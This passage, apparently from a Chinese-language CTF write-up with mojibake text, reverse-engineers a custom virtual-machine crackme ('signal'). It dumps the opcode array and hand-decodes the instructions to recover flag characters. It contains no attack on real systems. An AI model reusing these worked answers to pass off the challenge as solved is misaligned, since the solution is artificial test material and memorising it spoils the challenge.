class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x21</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x51</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x24</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x36</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x41</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x3F</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x72</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x33</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x18</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xA7</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x28</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x84</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x1E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x7A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;; </span><br><span class="line"><span class="keyword">int</span> a[]=&#123;<span class="number">10</span>,<span class="number">4</span>,<span class="number">16</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">32</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">12</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">33</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">32</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">81</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">36</span>,<span class="number">1</span>,<span class="number">12</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">37</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">54</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">65</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">32</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">37</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">32</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">65</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">34</span>,<span class="number">7</span>,<span class="number">63</span>,<span class="number">7</span>,<span class="number">52</span>,<span class="number">7</span>,<span class="number">50</span>,<span class="number">7</span>,<span class="number">114</span>,<span class="number">7</span>,<span class="number">51</span>,<span class="number">7</span>,<span class="number">24</span>,<span class="number">7</span>,<span class="number">-89</span>,<span class="number">7</span>,<span class="number">49</span>,<span class="number">7</span>,<span class="number">-15</span>,<span class="number">7</span>,<span class="number">40</span>,<span class="number">7</span>,<span class="number">-124</span>,<span class="number">7</span>,<span class="number">-63</span>,<span class="number">7</span>,<span class="number">30</span>,<span class="number">7</span>,<span class="number">122</span>&#125;;<span class="comment">//è¿è¡Œç»“æœ</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> *p=(<span class="keyword">int</span> *)s;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in"><span class="keyword">sizeof</span></span>(s)/<span class="number">4</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>,*(p+i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å¾ˆæ˜æ˜¾å‘ç°ï¼Œè¿™ä¸ªæ•°ç»„åˆšå¥½114ã€‚vmé€†å‘åŸºæœ¬æ˜¯è‡ªå·±å®šä¹‰äº†æŒ‡ä»¤é›†åšè¿ç®—çš„ï¼Œæ‰€ä»¥è¿™ä¸ªä¸å¯èƒ½æ˜¯flagï¼Œå°±åº”è¯¥æ˜¯æŒ‡ä»¤ï¼Œé‚£ä¹ˆè‡³äºæŒ‡ä»¤é›†åº”è¯¥åœ¨è¿™ä¸ªå‡½æ•°æœ‰ç»™è§£æï¼Œæ¥ç€å¾€ä¸‹çœ‹ã€‚</p><h2 id="åˆ†ææŒ‡ä»¤"><a href="#åˆ†ææŒ‡ä»¤" class="headerlink" title="åˆ†ææŒ‡ä»¤"></a>åˆ†ææŒ‡ä»¤</h2><p>è¿™é‡Œçœ‹äº†å¾ˆä¹…ï¼Œé‡Œé¢æœ‰ä¸€ä¸ªstr charæ•°ç»„å’Œä¸€ä¸ªcharå˜é‡v4ï¼Œç„¶åå…¶å®ƒçš„éƒ½æ˜¯intå˜é‡äº†ï¼Œä¸€å¼€å§‹å¯¹4ç»™intå˜é‡éƒ½åˆå§‹åŒ–0äº†ï¼Œå¤§æ¦‚ç‡æ˜¯åšä¸€ä¸ªä¸‹æ ‡çš„ã€‚ç„¶åcharæ•°ç»„åº”è¯¥æ˜¯è¾“å…¥çš„flagï¼Œè‡³äºv4å˜é‡çŒœæµ‹å¯èƒ½æ˜¯åšä¸€ä¸ªä¸­é—´æ•°çš„ï¼Œå°±ç›¸å½“äºå¯„å­˜å™¨ä¸€æ ·ã€‚</p><p>æ¥ä¸‹æ¥çœ‹çœ‹è¿™äº”ä¸ªintå˜é‡å¹²å˜›çš„ã€‚</p><p>å…ˆæ˜¯v9ï¼Œå‘ç°å®ƒåœ¨æ¯ä¸€ä¸ªcaseå½“ä¸­éƒ½æœ‰+1æˆ–è€…+2ã€‚å°±å¾ˆåƒæˆ‘ä»¬çš„ipå¯„å­˜å™¨ï¼Œæ¯æ‰§è¡Œä¸€æ¬¡æŒ‡ä»¤éƒ½å¾€åç§»ï¼Œç„¶åè¿™é‡Œ+1+2åº”è¯¥æ˜¯æŸäº›æŒ‡ä»¤æœ‰æ“ä½œæ•°ï¼Œå¯¼è‡´æŒ‡ä»¤å®½åº¦ä¸º2ï¼Œé‚£ä¹ˆv9å°±æ˜¯æŒ‡å‘å½“å‰æŒ‡ä»¤çš„ã€‚è€Œä¸”å¾ªç¯é€€å‡ºæ¡ä»¶å°±æ˜¯v9&gt;=a2ï¼Œa2æ˜¯æ•´ä¸ªæŒ‡ä»¤çš„é•¿åº¦ã€‚</p><p>å…¶æ¬¡v8,v8åœ¨æ‰€æœ‰æŒ‡ä»¤ä¸­åŸºæœ¬éƒ½æ˜¯åšstræ•°ç»„çš„ä¸‹æ ‡ï¼Œå¹¶ä¸”åšä¸‹æ ‡çš„æ—¶å€™ï¼Œstr[v8]éƒ½æ˜¯åšæºæ“ä½œæ•°ï¼Œå¹¶ä¸”åªåœ¨1å·æŒ‡ä»¤ä¸­æœ‰è‡ªå¢æ“ä½œã€‚</p><p>ç„¶åv7ï¼Œè¿™ä¸ªå¾ˆç®€å•ï¼Œåªåœ¨7å·æŒ‡ä»¤ä¸­å­˜åœ¨ï¼Œå¹¶ä¸”åšstr[100+v7]è¿™æ ·çš„ä¸‹æ ‡ï¼Œç„¶åå’Œåä¸€ä¸ªæ“ä½œæ•°ä½œæ¯”è¾ƒï¼Œå¦‚æœä¸ç­‰é‚£ä¹ˆé€€å‡ºï¼Œé‚£è¿™ä¸ªå°±åº”è¯¥æ˜¯æ¯”è¾ƒæŒ‡é’ˆï¼Œ7å·æŒ‡ä»¤åº”è¯¥æ˜¯ä½œæ¯”è¾ƒçš„æŒ‡ä»¤ã€‚å¤§æ¦‚ç‡ä¼šåšä¸€ä¸ªè¿ç®—ï¼Œè¿ç®—ç»“æœå°±æ˜¯str[100]å¾€åçš„ä½ç½®çš„å˜é‡ã€‚</p><p>æ¥ä¸‹æ¥çœ‹çœ‹v6ï¼Œåªåœ¨1å·æŒ‡ä»¤ä¸­å‡ºç°ï¼Œå¹¶ä¸”æ˜¯ä»¥str[100+v6]è¿™æ ·çš„ä¸‹æ ‡ï¼Œä½œä¸ºç›®çš„æ“ä½œæ•°ã€‚é‚£è¿™ä¸ªå¤§æ¦‚ç‡å°±æ˜¯åšä¸€ä¸ªå˜æ¢ç„¶åè¿ç®—ç»“æœä¿å­˜åˆ°str[100]å¼€å§‹å¾€åçš„ä½ç½®ã€‚</p><p>æœ€åä¸€ä¸ªæ˜¯v5ï¼Œåªåœ¨8å·æŒ‡ä»¤å‡ºç°ï¼Œä½œç”¨æ˜¯å–å‡ºv4çš„å€¼ä¿å­˜åœ¨str[v5]ä¸­ã€‚è¿™ä¸ªv4æˆ‘ä»¬å‰é¢åˆ†æå°±å¤§æ¦‚ç‡æ˜¯ä¸€ä¸ªæ™®é€šçš„å¯„å­˜å™¨ï¼Œè¿™é‡Œç›¸å½“äºå°±æ˜¯å–å¯„å­˜å™¨ä¸­çš„æ•°è¿˜ç»™å†…å­˜ä¸€æ ·çš„ã€‚</p><p>é‚£ä¹ˆè¿™äº›éƒ½äº†è§£ä¹‹åå°±å¯ä»¥å¾ˆè½»æ¾åœ°å†™å‡ºæŒ‡ä»¤çš„ä½œç”¨äº†ï¼Œå¦‚ä¸‹ã€‚</p><p><img src="/2021/11/03/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84%20singal%20writeup/2.png" alt="2"></p><p>æ¥ä¸‹æ¥å°±æ‰‹åŠ¨è§£ææŒ‡ä»¤ï¼Œè¿™ä¸ªæŒ‡ä»¤ç¼–ç æ¯”è¾ƒç®€å•ï¼Œæ— éå°±æ˜¯ä»å¤´å¼€å§‹ï¼Œé‡åˆ°2ï¼Œ3ï¼Œ4ï¼Œ5ï¼Œ7å°±å–å‡ºåä¸€ä¸ªæ•°ä¸€èµ·ä¸ä»–ç¼–ç ï¼Œå¦åˆ™å•ç‹¬ä½œä¸ºä¸€ä¸ªæŒ‡ä»¤ç¼–ç ã€‚</p><p>è¿™ä¸ªå…¶å®å¯ä»¥åšç¨‹åºç®—çš„ï¼Œä½†æ˜¯ä¸ºäº†ä¸€å¼€å§‹ç†è§£æ–¹ä¾¿ï¼Œæˆ‘ä¹Ÿè¿˜æ˜¯æ‰‹ç®—äº†ã€‚å¯ä»¥å‘ç°æ¯”è¾ƒæŒ‡ä»¤éƒ½é›†ä¸­åœ¨æœ€åäº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä»å¤´å¼€å§‹åˆ†æã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">10      //è¯»å–æ•°æ®</span><br><span class="line">4,16    //å–å‡ºstr[0]^16---&gt;rax</span><br><span class="line">8       //rax---&gt;str[0]</span><br><span class="line">//str[0]^=16;</span><br><span class="line">3,5     //å–å‡ºstr[0]-5---&gt;rax</span><br><span class="line">1       //rax---&gt;str[100]</span><br><span class="line">//str[100]=str[0]-5;</span><br><span class="line">//æ ¹æ®åé¢çš„æ¯”è¾ƒstr[100]=34ï¼Œæ‰€ä»¥(str[0]^16)-5==34</span><br><span class="line">//str[0]=55=&#x27;7&#x27;</span><br></pre></td></tr></table></figure><p>å¾ˆå®¹æ˜“ç®—å‡ºæ¥äº†str[0]=â€™7â€™ã€‚å‰©ä¸‹çš„åŒç†ï¼Œå› ä¸ºä½ä¹‹é—´æ¯”è¾ƒç‹¬ç«‹ï¼Œå¹¶ä¸”å®ƒæœ‰ä¸€å®šè§„å¾‹ï¼Œæ‰‹æ’¸è¿˜æ˜¯å¾ˆå—å°±å‡ºæ¥äº†çš„ã€‚</p><p>ä¸‹é¢ç»™å‡ºæˆ‘åšè¿™ä¸ªç”¨çš„è‰ç¨¿ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">10      //è¯»å–æ•°æ®</span><br><span class="line">4,16    //å–å‡ºstr[0]^16---&gt;rax</span><br><span class="line">8       //rax---&gt;str[0]</span><br><span class="line">//str[0]^=16;</span><br><span class="line">3,5     //å–å‡ºstr[0]-5---&gt;rax</span><br><span class="line">1       //rax---&gt;str[100]</span><br><span class="line">//str[100]=str[0]-5;</span><br><span class="line">//æ ¹æ®åé¢çš„æ¯”è¾ƒstr[100]=34ï¼Œæ‰€ä»¥(str[0]^16)-5==34</span><br><span class="line">//str[0]=55=&#x27;7&#x27;</span><br><span class="line">4,32    //str[1]^32---&gt;rax</span><br><span class="line">8       //rax---&gt;str[1]</span><br><span class="line">//str[1]^=32;</span><br><span class="line">5,3     //str[1]*3---&gt;rax</span><br><span class="line">1       //rax---&gt;str[1]</span><br><span class="line">//str[101]=(str[1]^32)*3</span><br><span class="line">//str[101]=63</span><br><span class="line">//str[1]=53=&#x27;5&#x27;</span><br><span class="line">3,2     </span><br><span class="line">8       //str[2]-=2;</span><br><span class="line">11</span><br><span class="line">1       //str[102]=str[2]-1;</span><br><span class="line">//str[2]-3=52</span><br><span class="line">//str[2]=55=&#x27;7&#x27;</span><br><span class="line">12</span><br><span class="line">8       //str[3]+=1;</span><br><span class="line">4,4</span><br><span class="line">1       //str[103]=str[3]^4;</span><br><span class="line">//(str[3]+1)^4=50</span><br><span class="line">//str[3]=55=&#x27;5&#x27;</span><br><span class="line">5,3</span><br><span class="line">8       //str[4]*=3;</span><br><span class="line">3,33 </span><br><span class="line">1       //str[104]=str[4]-33;</span><br><span class="line">//(str[4]*3)-33=114</span><br><span class="line">//str(4)=49=&#x27;1&#x27;</span><br><span class="line">11</span><br><span class="line">8</span><br><span class="line">11</span><br><span class="line">1</span><br><span class="line">//str[5]-2=51</span><br><span 